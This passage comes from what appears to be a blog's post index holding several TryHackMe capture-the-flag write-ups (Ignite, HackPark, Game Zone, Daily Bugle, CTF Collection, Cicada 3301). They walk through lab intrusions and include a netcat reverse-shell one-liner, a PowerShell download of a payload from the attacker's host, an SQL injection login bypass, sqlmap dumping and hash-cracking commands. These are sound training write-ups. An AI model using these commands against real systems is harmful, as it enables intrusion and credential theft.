directories Used hydra to crack passwords Exploited Wordpress to gain a reverse shell Used SSH tunnelling to open up an internal Jenkins server Escalated our privileges Jenkins using the Groovy Script consoleAs you can see, this was a very complex room which incorporates a lot of different technologies. If you are a beginner, one thing I would like you to take away from this is that enumeration is key. Enumerate everything as much as you possibly can so that you have a better idea of what to do.Another thing to keep in mind is that the obvious path sometimes isn’t the correct one. In this case, we found obvious credentials for multiple users like william and the phpmyadmin but they didn’t lead anywhere. If this happens, it is vital that you take a step back and reassess the information you have got up to this point, and then see what other routes you can go down.I hope you enjoyed this writeup." }, { "title": "Ignite Writeup | TryHackMe", "url": "/posts/ignite-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, ctf, boot2root, privesc, exploit", "date": "2022-01-21 00:00:00 +0000", "snippet": "A new start-up has a few issues with their web server.OverviewThis is my writeup for the Ignite CTF. The Ignite CTF is a free room of beginner difficulty which mainly tests your methodology. It is very heavy on information gathering, scanning, and enumeration, as well as finding exploits.How to AccessI completed this CTF challenge on TryHackMe.Link to the room: https://tryhackme.com/room/igniteScanning and EnumerationFirstly, I began with an Nmap scan:$ sudo nmap -sC -sV -oN initial 10.10.183.1Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 00:39 BSTNmap scan report for 10.10.183.1Host is up (0.075s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/fuel/|_http-server-header: Apache/2.4.18 (Ubuntu)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.68 secondsThe initial scan shows that only port 80 is open and is running a web server. Navigating to this shows a Fuel CMS page:The website is running a Fuel CMS (Content Management System) application on version 1.4. Scrolling down to the bottom also reveals a username and password combination:The scan also showed that there is a /fuel directory. Investigating this reveals a login form:It also shows that robots.txt has a disallowed entry - this so happens to be /fuel/.ExploitDB reveals that Fuel CMS v1.4 is vulnerable to remote code execution (RCE) using CVE-2018-16763 (found )Gaining AccessAfter downloading the exploit file and altering it so that it contained the target machine’s IP address, I was able to gain access to the machine as the www-data user:Using the following code, I was able to obtain a reverse shell using Netcat (found ):rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.150.161 4444 &gt; /tmp/fI then upgraded my terminal using Python’s pty module:Finding flag.txtI found the flag in the www-data user’s home directory:Escalating Privileges and Finding root.txtInvestigating the web application’s configuration, I found a database.php file which contained the root user’s credentials:I then used these credentials to escalate my privileges into the root user and then found the flag within the /root directory:And that’s it! All done!Summary and FeedbackThis challenge really tested my knowledge of scanning, enumeration, and finding vulnerabilities - an area which I’m desperately trying to optimise. If you are a beginner and haven’t quite got your methodology down, this machine will help you enhance it." }, { "title": "HackPark Writeup | TryHackMe", "url": "/posts/hackpark-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, windows, cve-2019-6714, rce, winpeas", "date": "2022-01-20 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the HackPark room on TryHackMe. This room involves bruteforcing a site’s login with Hydra, identifying and using a public exploit to gain access and then escalate your privileges.This is a intermediate room so if you are more of a beginner, then this may be to challenging. If you are new to Windows exploitation in general, I would recommend attempting the Steel Mountain or Alfred rooms.How to AccessI compelted this room on TryHackMe. You can access it here.StepsInformation GatheringAs always, I begin with an nmap scan:$ nmap -sC -sV -oN scans/initial -Pn 10.10.237.113Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 00:01 BSTNmap scan report for 10.10.237.113Host is up (0.044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5| http-methods: |_ Potentially risky methods: TRACE| http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx|_http-server-header: Microsoft-IIS/8.5|_http-title: hackpark | hackpark amusements3389/tcp open ssl/ms-wbt-server?| ssl-cert: Subject: commonName=hackpark| Not valid before: 2021-05-22T22:49:47|_Not valid after: 2021-11-21T22:49:47|_ssl-date: 2021-05-23T23:01:42+00:00; -1s from scanner time.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -1sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.14 secondsAs shown above, there is a website running on port 80. The main page shows a picture of pennywise (the 1990 version):As I inspected the website, gobuster detected a login page:Navigating to this page shows a generic login form for BlogEngine:Using Hydra to Bruteforce a LoginAfter trying a few default credential combinations, I booted up BurpSuite to intersept the requests as I log in:I then used Hydra to bruteforce the password for the admin user:Gaining AccessAfter I logged in, I found that the site is running Blog Engine version 3.3.6. Using searchsploit, I found that this version is vulnerable to remote code injection (RCE):I then copied this exploit (CVE-2019-6714) to my working directory and changed the listening IP address. I then navigated to http://&lt;machine ip&gt;/admin/app/editor/editpost.cshtml and uploaded the file. To do this, I created a Python HTTP server in the directory where the exploit was stored:Next, I nagivated to the base URL for the blog and overrided the theme http://10.10.108.108/?theme=../../App_Data/files. This triggers the vulnerability.I used netcat to catch the callback:Running whoami on the machine shows that I am logged in as iis apppool\\blog.Compromise the MachineEven though I have gained access to the machine, the current shell is quite unstable. So let’s update the shell. I did this by creating a payload through msfvenom:I then uploaded this file to the system using powershell:I also loaded up msfconsole and ran use exploit/multi/handler to catch the callback:I then ran sysinfo and discovered that this system is running the Windows 2012 R2 (6.3 Build 9600) operating system.Privilege Escalation with MetasploitAt this point, you have to perform more enumeration on the machine in order to find points of vulnerability. Although I managed to find the vulnerable binary, I was unable to find the abnormal service without looking at other writeups. The abnormal service is WindowsScheduler.I found the vulnerable binary by checking C:\\Program Files (x86)\\SystemScheduler:Using this information, I created another payload using msfvenom and called it Message.exe:I then uploaded it using the upload command:I then had to replace the binary which was already on the system:Finally, I set up netcat once again to catch the callback when the new file was executed:Now, I am logged in as the admin user with full privileges. So, I then retrieved both flags (user.txt and root.txt):Privilege Escalation without MetasploitIt is entirely possible to escalate your privileges without metasploit. I did this by creating a similar payload using msfvenom:I then powershell to upload the new payload to the C:\\Windows\\Temp directory:C:\\Windows\\Temp&gt; powershell -c \"Invoke-WebRequest -Uri 'http://10.9.150.161:80/shell.exe' -OutFile shell.exe\"As before, I created a Python HTTP server where the new payload was stored.To enumerate the machine, I then uploaded winPEAS (download here).Once uploaded, I executed winPEAS and found that this system was originally installed on 8/3/2019, 10:43:23 AM.And that’s it!Summary and FeedbackThis was a very challenging room, especially as I am fairly new to Windows exploitation. I had quite a lot of difficulty actually finding the answer to some of the tasks (even with hints). I would definitely recommend attempting other rooms, particularly if you’re new to Windows exploitation." }, { "title": "Game Zone Writeup | TryHackMe", "url": "/posts/game-zone-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, sqli, hashcracking, metasploit, sshtunnel", "date": "2022-01-19 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Game Zone TryHackMe room. To gain root, we first need to exploit a vulnerable login form via SQL injection. Then, using SQLMap and BurpSuite, we will dump the contents of the database so that we can crack the password. Finally, we will use SSH port forwarding to gain access to a hidden Webmin service and use metasploit to escalate our privileges.How to AccessI completed this room on TryHackMe. You can access it hereStepsInformation Gathering and EnumerationAs usual, we start of with information gathering. Let’s conduct an nmap scan to see which ports are open:$ nmap -sC -sV -oN initial 10.10.0.45 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 16:51 BSTNmap scan report for 10.10.0.45Host is up (0.050s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)|_ 256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Game ZoneService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.83 secondsAs we can see, there are two open ports: 22: SSH (v7.2p2) 80: HTTP web server (Apache v2.4.18)The main page shows a graphic of Agent 47 with a login form on the left side.Classic SQL InjectionAs the instructions indicate, this is vulnerable to SQL injection using the classic OR 1=1 -- -. Using this in the username field, it allows us to bypass the login functionality. We are subsequently redirected to a portal.php.We now have to use SQLMap to dump the contents of the database. But first, we have to know what happens when a search is made. I used BurpSuite for this:Now, save this into a .txt file and pass it into SQLMap using the following command:$ sqlmap -r request.txt --dbms=mysql --dump -r is the file which contains the request from BurpSuite --dbms is the type of database management system being used on the system (in this case it is mysql) --dump tells SQLMap to output the entire databaseOnce SQLMap is finished, it will output the contents of the database:Cracking Hashes with JohnTheRipperWe can now crack the hash with JohnTheRipper: hash.txt contains the hash(es) we are trying to crack --wordlist specifies the path to the wordlist (using rockyou.txt) --format is the hashing algorithm used (using SHA256)Now you can use this password to login via SSH and get the user.txt flag:Privilege EscalationNow it’s time to escalate our privileges by port forwarding through SSH. First run ss to get a list of listening ports on the machine. t display TCP sockets u display UDP sockets l displays only listening sockets p shows the process using the socket n doesn’t resolve service namesThe result of this shows 5 TCP ports running. Let’s use port 10000 sticks out as it didn’t show up on our initial nmap scan. Run the following command to unblock port 10000:$ ssh -L 10000:localhost:10000 agent47@&lt;ip&gt;This lets us access port 10000 through our localhost via a web browser (navigate to localhost:10000).Logging in as agent47 shows Webmin v1.580 is being used as the site’s Content Management System (CMS).Let’s use this information to search for any exploits:Searchsploit tells us that this specific version of Webmin is vulnerable to remote code injection (RCE). Let’s load up metasploit and escalate our privileges:Running this exploit gives us access to the machine as the root user:We can now retrieve the root.txt flag:And that’s it! All done!Summary and FeedbackIn this room we: Scanned ports using nmap Used SQL injection to compromise a login form Used sqlmap to dump the contents of the database Cracked the hashes using JohnTheRipper Used SSH port forwarding to unblock a hidden port Escalated our privileges by exploiting Webmin via remote code injectionThis room was fairly straightforward and didn’t take me too long to complete. This was the first time I had used SQLMap extensively so it was good to learn a bit more about it.I hope you enjoyed this writeup." }, { "title": "Daily Bugle Writeup | TryHackMe", "url": "/posts/daily-bugle-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, joomla, sqli, yum, sqlmap, hard", "date": "2022-01-18 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Daily Bugle room on TryHackMe. This is a room based in the Spiderman universe where you have to comprimise a Joomla CMS system via SQL injection. Then, after cracking some hashes, you escalate your privileges by taking advantage of yum.This is a hard room, so if you’re a beginner I would recommend attempting other rooms.How to AccessI completed this room on TryHackMe. You can access it here.StepsInformation Gathering and EnumerationAs always, let’s begin with an nmap scan:$ nmap -sC -sV -oN scans/initial 10.10.209.62# Nmap 7.91 scan initiated Tue May 25 15:34:03 2021 as: nmap -sC -sV -oN scans/initial 10.10.209.62Nmap scan report for 10.10.209.62Host is up (0.055s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)|_ 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-generator: Joomla! - Open Source Content Management| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40|_http-title: Home3306/tcp open mysql MariaDB (unauthorized)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue May 25 15:34:56 2021 -- 1 IP address (1 host up) scanned in 52.81 secondsSo, we have three ports open: SSH on port 22 (v7.4) HTTP on port 80 (Apache v2.4.6) MySQL on port 3306 (MariaDB)The main page of the website shows an article where spiderman is caught robbing a bank:Let’s see if there is any directories which we can exploit (I use gobuster for this):So this gobuster scan has revealed an /administrator directory which leads to a Joomla CMS login:I did some research and found that the version of Joomla can be found at http://&lt;ip&gt;/administrator/manifests/files/joomla.xml. The version of Joomla being used here is 3.7.0:Compromising Joomla via SQL InjectionA quick look on searchsploit shows that this version of Joomla is vulnerable to SQL injection. I did some more research and found this Python script on GitHub: https://github.com/NinjaJc01/joomblah-3/blob/master/joomblah.py. Downloading and executing this will reveal the hash for the jonah user:Cracking Hashes with HashcatFirst, we need to determine the type of hash we are going to crack. The hashcat cheatsheet shows that it is a “bcrypt $2*$, Blowfish (Unix)” hash:I used the following hashcat command to crack the hash. This took me about 10 minutes to crack, so be patient (it may take you longer depending on your machine).$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt -a specifies the attack mode -m specifies the hash type (3200 =&gt; “bcrypt $2*$, Blowfish (Unix)”) hash is the hash from our SQL injection /usr/share/wordlists/rockyou.txt is the wordlistWe can now login to Joomla as jonah:Getting a Reverse ShellIn Joomla, you can edit the template files to get a reverse shell. The article here discusses this in very good detail. I used the PHP reverse shell from pentest monkey (get it here)Make sure to change the IP address and port, and then setup your netcat listener to accept the callback:You are now logged in as apache. I then upgraded my shell using Python:Enumeration, Enumeration, EnumerationUnfortunately, this machine is setup so that you cannot access /home/jjameson or /root to get either of the flags. So we need to enumerate the machine more. For this, I uploaded linPEAS:Make sure to use chmod +x so that you can execute the linpeas.sh file. When you run it and go through the output, you will notice that there is a configuration.php file in the /var/www/html directory. This contains a password which can be used to SSH into the machine as the jjameson user:Accessing the MachineOnce you’re logged in as the jjameson user, you’ll be able to retrieve the user.txt flag in their /home directory:Privilege EscalationRunning sudo -l as jjameson shows that we can run yum without a password (using sudo):Looking online, you’ll notice that there is a GTFO bin for yum using sudo (get it here). This means that we can spawn an interactive root shell by loading a custom plugin.To do this, use the following commands:As you can see, when you run the final command, it spawns an interactive shell as root. From this, you’re able to get the root.txt flag:And that’s it! All done!Summary and FeedbackIn this room we: Scanned ports using nmap Used gobuster to enumerate directories Comprimised Joomla using SQL injection Cracked hashes using hashcat Used linPEAS to enumerate the system Escalated our privileges by exploiting yumAs I mentioned in the overview, this is a hard room so you may want to try some easier ones if you’re new to penetration testing or CTFs." }, { "title": "CTF Collection Volume 1 Writeup | TryHackMe", "url": "/posts/ctf-collection-vol1-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, ctf, steganography, cryptography, binary, beginner", "date": "2022-01-17 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the “CTF Collection Vol. 1” CTF. This room is designed to introduce you to how cryptography, stegonography, and binary CTF challenges are set, so if you are a beginner, this is perfect for you!How to AccessI completed this through the TryHackMe website.Link to the room: https://tryhackme.com/room/ctfcollectionvol1StepsTask 1 - What does the base said?Can you decode the following?VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==This is base64, decode it using the terminal:$ echo \"VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==\" | base64 --decodeTHM{j******************3}Task 2 - Meta metaMeta! meta! meta! meta……………………………..SEE Findme.jpgTo decode information from images, use exiftool:$ exiftool Findme.jpg ExifTool Version Number : 12.16File Name : Findme.jpgDirectory : .File Size : 34 KiBFile Modification Date/Time : 2021:03:01 22:29:34+00:00File Access Date/Time : 2021:03:01 22:29:37+00:00File Inode Change Date/Time : 2021:03:01 22:32:21+00:00File Permissions : rw-r--r--File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegJFIF Version : 1.01X Resolution : 96Y Resolution : 96Exif Byte Order : Big-endian (Motorola, MM)Resolution Unit : inchesY Cb Cr Positioning : CenteredExif Version : 0231Components Configuration : Y, Cb, Cr, -Flashpix Version : 0100Owner Name : THM{3x1f_0r_3x17}Comment : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 60.Image Width : 800Image Height : 480Encoding Process : Progressive DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)Image Size : 800x480Megapixels : 0.384As you can see from the “Owner Name”, the flag is: THM{3**********7}.Task 3 - Mon, are we going to be okay?Something is hiding. That’s all you need to knowSEE Extinction.jpgHad to use steghide for this:$ steghide info Extinction.jpg\"Extinction.jpg\": format: jpeg capacity: 1.3 KBTry to get information about embedded data ? (y/n) yEnter passphrase: embedded file \"Final_message.txt\": size: 79.0 Byte encrypted: rijndael-128, cbc compressed: yesLooks like there is a file embedded in the image. Let’s extract it:$ steghide extract -sf Extinction.jpgEnter passphrase:wrote extracted data to \"Final_message.txt\".Final_message.txtIt going to be over soon. Sleep my child.THM{5****************************n}Task 4 - Erm……MagickHuh, where is the flagThe flag was embedded in the text shown above. Highlighting it gave:Huh, where is the flag? THM{w********6}Task 5 - QRrrrrSuch technology is quite reliable.SEE QR.pngScanning the QR code reveals the flag:THM{q***************y}Task 6 - Reverse or read it?Both works, it’s all up to you.SEE hello.helloUsing r2 we can look deeply into the file:$ r2 hello.helloWarning: run r2 with -e io.cache=true to fix relocations in disassembly[0x00001060]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Check for vtables[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information[x] Use -AA or aaaa to perform additional experimental analysis.[0x00001060]&gt; afl0x00001060 1 42 entry00x00001090 4 41 -&gt; 34 sym.deregister_tm_clones0x000010c0 4 57 -&gt; 51 sym.register_tm_clones0x00001100 5 57 -&gt; 50 sym.__do_global_dtors_aux0x00001050 1 6 sym.imp.__cxa_finalize0x00001140 1 5 entry.init00x00001000 3 23 sym._init0x000011e0 1 1 sym.__libc_csu_fini0x00001145 1 24 sym.skip0x00001040 1 6 sym.imp.printf0x000011e4 1 9 sym._fini0x00001180 4 93 sym.__libc_csu_init0x0000115d 1 23 main0x00001030 1 6 sym.imp.puts[0x00001060]&gt; pdf @sym.skip┌ 24: sym.skip ();│ 0x00001145 55 push rbp│ 0x00001146 4889e5 mov rbp, rsp│ 0x00001149 488d3db80e00. lea rdi, str.THM345y_f1nd_345y_60 ; 0x2008 ; \"THM{345y_f1nd_345y_60}\" ; const char *format│ 0x00001150 b800000000 mov eax, 0│ 0x00001155 e8e6feffff call sym.imp.printf ; int printf(const char *format)│ 0x0000115a 90 nop│ 0x0000115b 5d pop rbp└ 0x0000115c c3 retAs we can see, the flag THM{3***************0}.Task 7 - Another decoding stuffCan you decode it?3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4LThis is base58. I used CyberChef to decode it:THM{1*******************5}Task 8 - Left or rightLeft, right, left, right… Rot 13 is too mainstream for this.MAF{atbe_max_vtxltk}This is a Caeser cipher with a shift value of 7.THM{h*************r}Task 9 - Make a commentNo downloadable file, no ciphered or encoded text. Huh …..The flag for this was embedded in the HTML code as a comment:&lt;p style=\"display:none;\"&gt; THM{4**********************7} &lt;/p&gt;Task 10 - Can you fix it?I accidentally messed up with this PNG file. Can you help me fix it? Thanks ^^SEE spoil.pngAs the challenge states, this is a corrupted PNG file. I first dumped the contents into a file using xxd:$ xxd --plain spoil.png &gt; spoil_hex_dump.txtLooking at the head of the file shows:$ head spoil_hex_dump 2333445f0d0a1a0a0000000d4948445200000320000003200806000000db700668000000017352474200aece1ce9000000097048597300000ec400000ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5abb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b200909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce4437404444444444660e0510111111111119370a202222222222326e1440444444444464dc28808888888888c8b8510011111111119171a300222222222222e34601444444444444c68d028888888888888c1b0510111111111119370aThe front 8 characters indicate the format of the given file. For PNG, it is 89504e47, and as shown above, the first 8 characters are 2333445f. I changed this using nano.To get the flag I had to upload the image to CyberChef. I first had to decode the information from the hex format, and then render the iamge using the raw data.Task 11 - Read itSome hidden flag inside Tryhackme social account.The hint for this challenge is simply “reddit”. A quick Google search for “TryHackMe room reddit” gives the following result:Navigating to this page gives the flag:Task 12 - Spin my headWhat is this?++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++++++.------------.+++++.&gt;+++++++++++++++++++++++.&lt;&lt;++++++++++++++++++.&gt;&gt;-------------------.---------.++++++++++++++.++++++++++++.&lt;++++++++++++++++++.+++++++++.&lt;+++.+.&gt;----.&gt;++++.The hint for this challenge is binaryfuck.The given code uses the programming language “brainfuck”. I used an online decoder to get the flag.Task 13 - An exclusiveExclusive strings for everyone!S1: 44585d6b2368737c65252166234f20626dS2: 1010101010101010101010101010101010Going by the challenge name, I assumed this would be XOR. Using an online XOR calculator gave me the flag:Task 14 - Binary walkPlease exflitrate my file :)SEE hell.jpgThe hint for this challenge is Binwalk. After some research, I found that this was a tool for searching a binary image for embedded files and executable code. Using this in the terminal gave me an extracted file called “hello_there.txt” which contained the flag:$ binwalk hell.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0230 0x1E TIFF image data, big-endian, offset of first image directory: 8265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt266099 0x40F73 End of Zip archive, footer length: 22$ cat _hell.jpg.extracted/hello_there.txtThank you for extracting me, you are the best!THM{y0***********u7}Task 15 - DarknessThere is something lurking in the dark.SEE dark.pngThe challenge hint suggested using stegsolve. Running this with the opened file, I began to cycle through the planes. Eventually I found the flag (Blue plane phase 1):Task 16 - A sounding QRHow good is your listening skill?SEE QRCRF.pngDecoding the QR code revealed a link to a soundcloud track:The music track gives the flag (you might have to slow it down).Task 17 - Dig up the pastSometimes we need a ‘machine’ to dig the pastTarget website: https://www.embeddedhacker.com/Targetted time: 2 January 2020The hint for this challenge is the Wayback machine. This is a website that stores web pages with the date and time of each captured site.Searching for the target website on the WayBack machine and using the target time:This revealed the layout of the website, giving me the flag:Task 18 - Uncrackable!Can you solve the following? By the way, I lost the key. Sorry &gt;.&lt;MYKAHODTQ{RVG_YVGGK_FAL_WXF}Flag format: TRYHACKME{FLAG IN ALL CAP}From the clue word “key” I assumed this would be some key-based cipher. I tried a few different ones with various keys and eventually found the flag using the Vigenere cipher with the key “THM”:Task 19 - Small basesDecode the following text.581695969015253365094191591547859387620042736036246486373595515576333693Using the hint (dec -&gt; hex -&gt; ascii), I first converted the string to hex and then from hex into textual format:Task 20 - Read the packetI just hacked my neighbor’s WiFi and try to capture some packet. He must be up to no good. Help me find it.SEE flag.pcapngUsing wireshark, I used the filter to find HTTP GET requests:I then followed the HTTP stream and found the flag:Summary and FeedbackWhile these challenges were very straightfoward, they were also a lot of fun. This room provides a very good basis for those who are intereseted in cryptography and wish to learn how to attempt more complex challengs." }, { "title": "Cicada 3301 Writeup | TryHackMe", "url": "/posts/cicada-3301-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, cicada3301, security, audio, steganography, cryptography", "date": "2022-01-16 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Cicada 3301 Vol. 1 CTF. This challenge is based on the same real-life internet puzzle by the same name. This challenge uses a mix of intermediate steganography and cryptography techniques as well as using the same methods from the real-life challenge.History of the ChallengeThe real-life challenge was originally set on January 4th 2012, on 4chan and ran for around a month. A second challenge began a year later with the third and final round the consecutive year. Cicada 3301 is the name given to the organisation who issued the challenges.The purpose of the puzzles were to find and recruit “highy intelligent individuals” who wish to improve cryptography, privacy and anonymity online. The third challenge still remains unsolved and Cicada 3301 has remained silence since it was issued.How to AccessI completed this challenge on TryHackMe:Link to the room: https://tryhackme.com/room/cicada3301vol1StepsTwo files are given as part of the challenge: 3301.wav welcome.jpgAnalyze The AudioUse Sonic Visualizer to analyze the audioOpening Sonic Visualizer and importing the 3301.wav audio file shows the waveform:Listening to the file will not reveal anything special. To find the solution, add a spectogram:For some reason I could not scan the QR code in the format above, so I added a white-on-black filter:Scanning the QR code gives the link, which is the answer to the first challenge:https://pastebin.com/w******aDecode the PassprahseThe link from the previous challenge reveals the following text:Passphrase: S*********************hKey: Q******hBoth of which are encoded using Base64:Passphrase: H***_*_*********3!Key: C****aThe next task specifies that you need to use the passphrase along with the key to fully decode the cipher. The hint for the challenge is French Diplomat Cipher. A quick Google search reveals that the French diplomat is Blaise de Vigenère who was also a cryptographer and the supposed creator of the Vigenère cipher.Using the key and the passphrase with the cipher gives the fully decoded passphrase:Gather MetadataThis task involves using steghide against the welcome.jpg image to extract a link.$ steghide extract -sf welcome.jpgEnter passphrase:the file \"invitation.txt\" does already exist. overwrite ? (y/n) ywrote extracted data to \"invitation.txt\".Using the passphrase reveals invitation.txt which contains the link: https://imgur.com/a/c*****a.Make sure to download this image as it is needed for the next challenge.Find Hidden FilesThe next challenge uses outguess, a steganography tool which was used to solve one of the original Cicada challenges.$ outguess -r imgur_image.jpg outputThe output is:-----BEGIN PGP SIGNED MESSAGE-----Hash: SHA1Welcome again.Here is a book code. To find the book, break this hash:b******************************************************************************************************************************8Use positive integers to go forward in the text use negative integers to go backwards in the text.I:1:6I:2:15I:3:26I:5:4I:6:15I:10:26//I:13:5I:13:1I:14:7I:3:29I:19:8I:22:25/I:23:-1I:19:-1I:2:21I:5:9I:24:-2I:22:1I:38:1Good luck.3301-----BEGIN PGP SIGNATURE-----Version: GnuPG v1.4.11 (GNU/Linux)iQIcBAEBAgAGBQJQ5QoZAAoJEBgfAeV6NQkPf2IQAKWgwI5EC33Hzje+YfeaLf6msLKjpc2Go98BWGReikDLS4PpkjX962L4Q3TZyzGenjJSUAEcyoHVINbqvK1sMvE59lBPmsdBMDPreA8oAZ3cbwtI3QuOFi3tY2qI5sJ7GSfUgiuI6FVVYTU/iXhXbHtLboY4Sql5y7GaZ65cmH0eA6/418d9KL3Qq3qkTcM/tRAHhOZFMZfT42nsbcvZ2sWiYyrAT5C+gs53YhODxEY0T9M2fam5AgUIWrMQa3oTRHSoNAefrDuOE7YtPy40j7kk5/5RztmAzeEdRd8QS1ktHMezXEhdDP/DEdIJCLT5eA27VnTY4+x1Ag9tsDFuitY42kEaVtCrf/36JAAwEcwOg2B/stdjXe10RHFStY0N9wQdReW3yAOBohvtOubicbYYmSCS1Bx91z7uYOo2QwtRaxNs69beSSy+oWBef4uTir8Q6WmgJpmzgmeG7ttEHquj69CLSOWOm6Yc6qixsZy7ZkYDrSVrPwpAZdEXip7OHST5QE/Rd1M8RWCOODba16LuURKvgl0/nZumrPQYbB1roxAaCMtlMoIOvwcyldO0iOQ/2iD4Y0L4sTL7ojq2UYwXbCotrhYv1srzBIOh+8vuBhV9ROnf/gab4tJII063EmztkBJ+HLfst0qZFAPHQG2241kaNgYIYeikTrweFqSK=Ybd6-----END PGP SIGNATURE-----Book CipherAt first glance, it looks like the hash is SHA1 but this is incorrect. The hash is actually SHA512. Using http://md5hashing.net to crack it:https://pastebin.com/6******5This contains text from a book called Liber AL vel Legis by Aleister Crowley, which means The Book of the Law. This was also used as part of the Cicada 3301 challenge.To crack the code, use the instructions from the output earlier. For instance, I:1:6 means line 1, character 6. It was also assumed that spaces are not counted although punctuation are.Deciphering the message gives a link:https://bit.ly/3*****HThe Final SongThe link from the previous section redirects to a soundcloud music track, the name of which is the solution to the final challenge.This song was published and produced by Cicada 3301 for the real-life challenge.Summary and FeedbackThis was an extremely fun challenge. If you are interested in steganopgrahy, cryptography, or the Cicada 3301 challenge, this is perfect for you!" }, { "title": "Blog Writeup | TryHackMe", "url": "/posts/blog-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, cve-2019-8943, wordpress, blog, web, medium", "date": "2022-01-15 00:00:00 +0000", "snippet": "Billy Joel made a Wordpress blog!WalkthroughI had to change /etc/hosts to include:blog.thm VICTIM_IPInitial nmap scan:$ nmap -sC -sV -p- -T4 VICTIM_IPStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-11 19:54 GMTNmap scan report for VICTIM_IPHost is up (0.045s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)|_ 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.0| http-robots.txt: 1 disallowed entry |_/wp-admin/|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: 